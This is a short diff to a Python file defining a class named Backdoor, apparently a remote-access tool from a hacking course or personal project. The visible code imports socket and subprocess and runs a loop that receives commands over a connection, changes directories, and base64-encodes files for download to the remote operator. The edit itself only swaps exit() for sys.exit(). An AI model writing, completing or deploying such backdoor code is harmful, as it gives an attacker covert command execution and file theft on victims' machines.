@@ -5,7 +5,7 @@ import json  # https://docs.python.org/3/library/json.html
 import os  # https://docs.python.org/3/library/os.html
 import socket  # https://docs.python.org/3/library/socket.html
 import subprocess  # https://docs.python.org/3/library/subprocess.html
-# import sys  # https://docs.python.org/3/library/sys.html
+import sys  # https://docs.python.org/3/library/sys.html
 
 
 class Backdoor:
@@ -44,8 +44,6 @@ class Backdoor:
             return base64.b64encode(file.read())
 
     def run(self):
-        command_result = ""
-
         while True:
             command = self.reliable_receive()
 
@@ -53,7 +51,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
